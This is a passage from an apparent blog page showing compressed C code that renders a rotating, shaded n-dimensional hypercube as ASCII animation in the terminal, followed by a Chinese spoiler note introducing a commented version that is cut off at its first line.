vex[vexIndex*dimension+k]=k==sign?<span class="number">-1</span>*vex[(vexIndex<span class="number">-1</span>)*dimension+k]:vex[(vexIndex<span class="number">-1</span>)*dimension+k];&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>,n=<span class="number">0</span>;vexIndex*dimension&lt;vexNum;vexIndex++,n=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> linkIndex=<span class="number">0</span>;linkIndex&lt;vexIndex;linkIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                <span class="keyword">if</span>(vexLink[linkIndex*dimension+i]==vexIndex) vexLink[vexIndex*dimension+n++]=linkIndex;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=vexIndex+<span class="number">1</span>,difference=<span class="number">0</span>,tooManyDiff,sign;i*dimension&lt;vexNum&amp;&amp;n!=dimension;i++,difference=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">0</span>;k&lt;dimension&amp;&amp;difference&lt;=<span class="number">1</span>;k++)</span><br><span class="line">                <span class="keyword">if</span>(vex[i*dimension+k]!=vex[vexIndex*dimension+k]) difference++;</span><br><span class="line">            <span class="keyword">if</span>(difference==<span class="number">1</span>) vexLink[vexIndex*dimension+n++]=i;&#125;&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> cur1=<span class="number">0</span>,normalIndex=<span class="number">0</span>;cur1&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur1+=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> cur2=<span class="number">0</span>,pDiag=<span class="number">0</span>;cur2&lt;vexNum/dimension&amp;&amp;normalIndex!=<span class="number">2</span>*face;cur2++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cur1==cur2) <span class="keyword">continue</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension&amp;&amp;!pDiag;i++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;!pDiag;j++)</span><br><span class="line">                    <span class="keyword">if</span>(vexLink[vexLink[cur1*dimension+i]*dimension+j]==cur2) pDiag=<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">if</span>(pDiag)&#123;</span><br><span class="line">                <span class="keyword">int</span> <span class="keyword">public</span>[dimension<span class="number">-1</span>];</span><br><span class="line">                <span class="built_in">memset</span>(<span class="keyword">public</span>,<span class="number">0xff</span>,<span class="keyword">sizeof</span>(<span class="keyword">public</span>));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,k=<span class="number">0</span>;i&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension&amp;&amp;k&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                        <span class="keyword">if</span>(vexLink[cur1*dimension+i]==vexLink[cur2*dimension+j]) <span class="keyword">public</span>[k++]=vexLink[cur1*dimension+i];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=normalIndex;i++)</span><br><span class="line">                    <span class="keyword">if</span>  (   (cur1==normalLink[i*<span class="number">3</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur1==normalLink[i*<span class="number">3</span>+<span class="number">2</span>])</span><br><span class="line">                        &amp;&amp;  (cur2==normalLink[i*<span class="number">3</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||cur2==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]))</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;dimension<span class="number">-1</span>;j++)</span><br><span class="line">                            <span class="keyword">if</span>(<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">1</span>]||<span class="keyword">public</span>[j]==normalLink[i*<span class="number">3</span>+<span class="number">2</span>]) <span class="keyword">public</span>[j]=<span class="number">-1</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension<span class="number">-1</span>;i++)</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">public</span>[i]!=<span class="number">-1</span>)&#123;</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;<span class="number">3</span>;j++)normalLink[normalIndex*<span class="number">3</span>+j]=j==<span class="number">0</span>?cur1:j==<span class="number">1</span>?cur2:<span class="keyword">public</span>[i];</span><br><span class="line">                        normalIndex++;&#125;&#125;&#125;</span><br><span class="line">    <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="built_in">memcpy</span>(vexO,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">float</span> angle=<span class="number">0</span>;;angle+=deltaA)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                out_f[i][j]=<span class="number">-1</span>;</span><br><span class="line">                dis[i][j]=(<span class="keyword">float</span>)(<span class="number">-4.0</span>*size);&#125;</span><br><span class="line">        <span class="built_in">memcpy</span>(vex,vexO,<span class="keyword">sizeof</span>(vexO));</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> rotationIndex=<span class="number">0</span>,r_i=<span class="number">0</span>;rotationIndex&lt;<span class="keyword">sizeof</span>(rotateAround)/<span class="keyword">sizeof</span>(rotateAround[<span class="number">0</span>])/<span class="number">2</span>;rotationIndex++,r_i=<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;dimension;i++)</span><br><span class="line">                    <span class="keyword">if</span>(i==rotateAround[rotationIndex*<span class="number">2</span>+r_i])</span><br><span class="line">                        vex[vexIndex*dimension+i]=vexTemp[vexIndex*dimension+i]*<span class="built_in">cos</span>(vAxis[rotationIndex]*angle)+vexTemp[vexIndex*dimension+rotateAround[rotationIndex*<span class="number">2</span>+!r_i]]*<span class="built_in">sin</span>(vAxis[rotationIndex]*angle)*(<span class="number">1</span><span class="number">-2</span>*r_i++);&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">            <span class="built_in">memcpy</span>(vexTemp,vex,<span class="keyword">sizeof</span>(vex));</span><br><span class="line">            <span class="keyword">int</span> c=!(i^<span class="number">1</span>),b=i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+!(i^<span class="number">1</span>)] = vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) + vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++) vex[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)] = vexTemp[vexIndex*dimension+(i&lt;=<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>)]*<span class="built_in">cos</span>(initialCam[i]) - vexTemp[vexIndex*dimension+!(i^<span class="number">1</span>)]*<span class="built_in">sin</span>(initialCam[i]);&#125;</span><br><span class="line">        <span class="keyword">float</span> xyBefore[<span class="number">2</span>*vexNum];</span><br><span class="line">        <span class="built_in">memcpy</span>(vexProjected,vex,<span class="keyword">sizeof</span>(vex[<span class="number">0</span>])*vexNum);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> d=dimension<span class="number">-1</span>;d&gt;=<span class="number">2</span>;d--)&#123;</span><br><span class="line">            <span class="keyword">if</span>(d==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;vexNum/dimension;i++) <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">1</span>;j++) xyBefore[i*<span class="number">2</span>+j]=vexProjected[i*dimension+j];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++)&#123;</span><br><span class="line">                    <span class="keyword">float</span> vec1[<span class="number">3</span>],vec2[<span class="number">3</span>];</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                        vec1[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">1</span>]*dimension+i];</span><br><span class="line">                        vec2[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]-vexProjected[normalLink[normalIndex*<span class="number">3</span>+<span class="number">2</span>]*dimension+i];&#125;</span><br><span class="line">                    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]=vec1[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>]*vec2[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]-vec1[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">1</span>]*vec2[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">0</span>];</span><br><span class="line">                    <span class="keyword">float</span> normalLength=calLength(&amp;normalResultSet[<span class="number">3</span>*normalIndex],<span class="number">3</span>);</span><br><span class="line">                    <span class="keyword">if</span>(normalLength!=<span class="number">0</span>)</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]/=normalLength;</span><br><span class="line">                    <span class="keyword">if</span>(!transparent)&#123;</span><br><span class="line">                        <span class="keyword">float</span> slidedVec[<span class="number">3</span>],slideLength,vexLength=calLength(&amp;vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension],<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) slidedVec[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>]*dimension+i]+normalResultSet[<span class="number">3</span>*normalIndex+i];</span><br><span class="line">                        slideLength=calLength(slidedVec,<span class="number">3</span>);</span><br><span class="line">                        <span class="keyword">if</span>(slideLength&gt;vexLength)</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) normalResultSet[<span class="number">3</span>*normalIndex+i]*=<span class="number">-1</span>;&#125;&#125;&#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> vexIndex=<span class="number">0</span>;vexIndex&lt;vexNum/dimension;vexIndex++)</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> axis=<span class="number">0</span>;axis&lt;d;axis++) vexProjected[vexIndex*dimension+axis]=vexProjected[vexIndex*dimension+axis]*lightSrcDis/(lightSrcDis-vexProjected[vexIndex*dimension+d]);&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> sx=<span class="number">0</span>;sx&lt;size;sx++) <span class="keyword">for</span>(<span class="keyword">int</span> sy=<span class="number">0</span>;sy&lt;size;sy++)</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> normalIndex=<span class="number">0</span>,inside=<span class="number">1</span>;normalIndex&lt;<span class="number">2</span>*face;normalIndex++,inside=<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">float</span> tCenter[<span class="number">2</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">                <span class="keyword">float</span> x[<span class="number">3</span>],y[<span class="number">3</span>],z[<span class="number">3</span>],xb[<span class="number">3</span>],yb[<span class="number">3</span>];</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">                    x[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension];</span><br><span class="line">                    tCenter[<span class="number">0</span>]+=x[i];</span><br><span class="line">                    y[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">1</span>];</span><br><span class="line">                    tCenter[<span class="number">1</span>]+=y[i];</span><br><span class="line">                    z[i]=vexProjected[normalLink[normalIndex*<span class="number">3</span>+i]*dimension+<span class="number">2</span>];</span><br><span class="line">                    xb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>];</span><br><span class="line">                    yb[i]=xyBefore[normalLink[normalIndex*<span class="number">3</span>+i]*<span class="number">2</span>+<span class="number">1</span>];&#125;</span><br><span class="line">                tCenter[<span class="number">0</span>]/=<span class="number">3</span>;tCenter[<span class="number">1</span>]/=<span class="number">3</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>&amp;&amp;inside;i++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(     ((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            ?(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            :(sy-move-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(sx-move-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>]))</span><br><span class="line">                            ||((tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])+eOffest&gt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])</span><br><span class="line">                            &amp;&amp;(tCenter[<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(x[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])-eOffest&lt;(y[i==<span class="number">0</span>?<span class="number">2</span>:i==<span class="number">1</span>?<span class="number">2</span>:<span class="number">1</span>]-y[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])*(tCenter[<span class="number">0</span>]-x[i==<span class="number">0</span>?<span class="number">1</span>:i==<span class="number">1</span>?<span class="number">0</span>:<span class="number">0</span>])))</span><br><span class="line">                        inside=<span class="number">0</span>;&#125;</span><br><span class="line">                <span class="keyword">if</span>(inside)&#123;<span class="keyword">float</span> alpha,currentDis,p[<span class="number">4</span>];</span><br><span class="line">                    <span class="keyword">if</span>(transparent) out_f[sy][sx]=out_f[sy][sx]&lt;<span class="number">0</span>?<span class="number">1</span>:out_f[sy][sx]+<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        p[<span class="number">0</span>]= yb[<span class="number">0</span>]*z[<span class="number">1</span>] -yb[<span class="number">0</span>]*z[<span class="number">2</span>] -yb[<span class="number">1</span>]*z[<span class="number">0</span>] +yb[<span class="number">1</span>]*z[<span class="number">2</span>] +yb[<span class="number">2</span>]*z[<span class="number">0</span>] -yb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">1</span>]=-xb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">0</span>]*z[<span class="number">2</span>] +xb[<span class="number">1</span>]*z[<span class="number">0</span>] -xb[<span class="number">1</span>]*z[<span class="number">2</span>] -xb[<span class="number">2</span>]*z[<span class="number">0</span>] +xb[<span class="number">2</span>]*z[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">2</span>]= xb[<span class="number">0</span>]*yb[<span class="number">1</span>] -xb[<span class="number">0</span>]*yb[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">0</span>] +xb[<span class="number">1</span>]*yb[<span class="number">2</span>] +xb[<span class="number">2</span>]*yb[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">1</span>];</span><br><span class="line">                        p[<span class="number">3</span>]=-xb[<span class="number">0</span>]*yb[<span class="number">1</span>]*z[<span class="number">2</span>] +xb[<span class="number">0</span>]*yb[<span class="number">2</span>]*z[<span class="number">1</span>] +xb[<span class="number">1</span>]*yb[<span class="number">0</span>]*z[<span class="number">2</span>] -xb[<span class="number">1</span>]*yb[<span class="number">2</span>]*z[<span class="number">0</span>] -xb[<span class="number">2</span>]*yb[<span class="number">0</span>]*z[<span class="number">1</span>] +xb[<span class="number">2</span>]*yb[<span class="number">1</span>]*z[<span class="number">0</span>];</span><br><span class="line">                        currentDis=lightSrcDis*(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)+p[<span class="number">3</span>])/(p[<span class="number">0</span>]*(sx-move)+p[<span class="number">1</span>]*(sy-move)-p[<span class="number">2</span>]*lightSrcDis);</span><br><span class="line">                        <span class="keyword">if</span>(currentDis&gt;dis[sy][sx])&#123;</span><br><span class="line">                            alpha=<span class="number">0</span>;</span><br><span class="line">                            <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++) alpha+=normalResultSet[normalIndex*<span class="number">3</span>+i]*light[i];</span><br><span class="line">                            dis[sy][sx]=currentDis;</span><br><span class="line">                            out_f[sy][sx]=alpha&gt;<span class="number">1</span>||alpha&lt;<span class="number">-1</span>?alpha&gt;<span class="number">1</span>?<span class="number">10</span>:<span class="number">0</span>:(alpha*<span class="number">10</span>+<span class="number">10</span>)*<span class="number">0.5</span>;&#125;&#125;&#125;&#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>,outIndex;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(!transparent) outIndex=(<span class="keyword">int</span>)out_f[i][j];</span><br><span class="line">                <span class="keyword">else</span> outIndex=(<span class="keyword">int</span>)(<span class="built_in">pow</span>((<span class="number">1</span><span class="number">-1</span>/(transparent*out_f[i][j]+<span class="number">1</span>)),<span class="number">2</span>)*<span class="number">10</span>);</span><br><span class="line">                out_f[i][j]!=<span class="number">-1</span>?<span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[outIndex],shade[outIndex]):<span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">            &#125;<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;<span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);<span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);usleep(<span class="number">30000</span>);&#125;&#125;</span><br></pre></td></tr></table></figure><div class='spoiler collapsed'>    <div class='spoiler-title'>        这代码是给人看的？¯\_(ツ)_/¯    </div>    <div class='spoiler-content'>        <p>确实不是给你看的，以上代码已经把格式压缩到最小了，只是看起来比较好看而已，以下是以下是带注释与测试代码的源码，请在windows下编译</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span 